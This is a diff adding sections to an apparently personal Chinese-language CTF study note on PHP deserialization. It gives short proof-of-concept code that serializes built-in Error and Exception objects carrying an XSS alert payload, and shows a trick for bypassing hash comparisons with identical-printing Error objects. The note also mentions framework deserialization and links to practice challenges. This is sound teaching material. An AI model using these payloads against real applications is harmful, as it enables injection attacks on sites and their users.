@@ -171,9 +171,98 @@ O:1:"A":2:{s:5:"uname";s:84:"123123123123123123123123123123123123123123123123123
 
 
 
+# 原生类
+
+**基本思路也就是利用PHP环境中内置的类的魔术方法**
+拿一个简单的例子：
+```php
+<?php
+$a = unserialize($_GET['whoami']);
+echo $a;//把类当作字符串使用时触发__toString
+?>
+```
+会发现代码中并没有明确定义的类。
+首先要知道php环境中是有一些原本就有的类，而我们经常利用的有`Error  Exception SoapClient DirectoryIterator SimpleXMLElement`这几个，而我们如果传入一个原生类的序列化字符串给这个程序，他就会调用原生类的`__toString`魔术方法,如果我们对其加以利用，就能实现攻击
+
+## Error 内置类
+
+可以利用其中的`__toString`进行**XSS**攻击
+- 适用于php7版本
+
+简单POC：
+```php
+<?php
+$a = new Error("<script>alert('xss')</script>");
+$b = serialize($a);
+echo urlencode($b);  
+?>
+```
+
+
+
+## Exception 内置类
+
+可以利用其中的`__toString`进行**XSS**攻击
+- 适用于php5、7版本
+
+简单POC：
+```php
+<?php
+$a = new Exception("<script>alert('xss')</script>");
+$b = serialize($a);
+echo urlencode($b);  
+?>
+```
+
+
+**简单练习：**
+[[blog/安全/靶场/BUU_[BJDCTF 2nd]xss之光\|BUU_[BJDCTF 2nd]xss之光]]
+
+## 使用 Error/Exception 内置类绕过哈希比较
+
+看下面代码：
+```php
+<?php
+$a = new Error("payload",1);$b = new Error("payload",2);//注意需要在同一行定义
+echo $a;
+echo "\r\n\r\n";
+echo $b;
+```
+输出如下：
+```php
+Error: payload in /usercode/file.php:2
+Stack trace:
+#0 {main}
+
+Error: payload in /usercode/file.php:2
+Stack trace:
+#0 {main}
+```
+
+可见，`$a` 和 `$b` 这两个错误对象本身是不同的，但是 `__toString` 方法返回的结果是**相同的**。
+
+知道了前置知识，我们下面看例题：
+[[blog/安全/靶场/BUU_[极客大挑战 2020]Greatphp\|BUU_[极客大挑战 2020]Greatphp]]
+
+
+
+
+# 框架类反序列化
+
+也就是这种不是原生代码导致的反序列化漏洞，而是一些开发框架，比如thinkphp，Yii等框架导致的反序列化漏洞
+
+
+例题：
+[[blog/安全/靶场/BUU_[安洵杯 2019]iamthinking\|BUU_[安洵杯 2019]iamthinking]]
+
+
+
 
 
 # 靶场练习
 
 [[blog/安全/靶场/CTFshow_反序列化1\|CTFshow_反序列化1]]
+[[CTFshow_反序列化2(懒，没做完)\|CTFshow_反序列化2(懒，没做完)]]
+[[CTFshow_反序列化3(累，没做完)\|CTFshow_反序列化3(累，没做完)]]
+[[CTFshow_反序列化4(困，没做完)\|CTFshow_反序列化4(困，没做完)]]
 [[blog/安全/靶场/BUU_[极客大挑战 2019]PHP1\|BUU_[极客大挑战 2019]PHP1]]
